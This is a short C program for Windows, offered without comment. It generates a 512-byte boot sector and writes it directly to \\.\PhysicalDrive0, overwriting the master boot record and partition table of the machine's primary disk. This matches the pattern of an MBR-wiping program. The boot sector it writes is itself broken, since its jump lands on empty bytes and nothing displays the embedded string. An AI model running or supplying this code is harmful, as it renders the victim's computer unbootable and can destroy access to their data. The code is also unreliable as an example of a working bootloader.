#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void create_bootloader_file(const char *file_path) {
    unsigned char bootloader[512] = {
        0xEB, 0x3C, 0x90,
        'H', 'e', 'l', 'l', 'o', ',', ' ', 'W', 'o', 'r', 'l', 'd', '!', 0x00
    };

    for (int i = 18; i < 510; i++) {
        bootloader[i] = 0x00;
    }
    bootloader[510] = 0x55;
    bootloader[511] = 0xAA;

    FILE *f = fopen(file_path, "wb");
    if (f == NULL) {
        exit(EXIT_FAILURE);
    }
    fwrite(bootloader, sizeof(unsigned char), 512, f);
    fclose(f);
}

void write_bootloader_to_disk(const char *disk_path, const char *bootloader_path) {
    unsigned char bootloader_bytes[512];
    
    FILE *f = fopen(bootloader_path, "rb");
    if (f == NULL) {
        exit(EXIT_FAILURE);
    }
    fread(bootloader_bytes, sizeof(unsigned char), 512, f);
    fclose(f);

    HANDLE disk = CreateFile(disk_path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (disk == INVALID_HANDLE_VALUE) {
        exit(EXIT_FAILURE);
    }

    DWORD bytes_written;
    WriteFile(disk, bootloader_bytes, 512, &bytes_written, NULL);
    CloseHandle(disk);
}

int main() {
    const char *bootloader_file = "bootloader.bin";
    const char *disk_path = "\\\\.\\PhysicalDrive0";

    create_bootloader_file(bootloader_file);
    write_bootloader_to_disk(disk_path, bootloader_file);

    return 0;
}
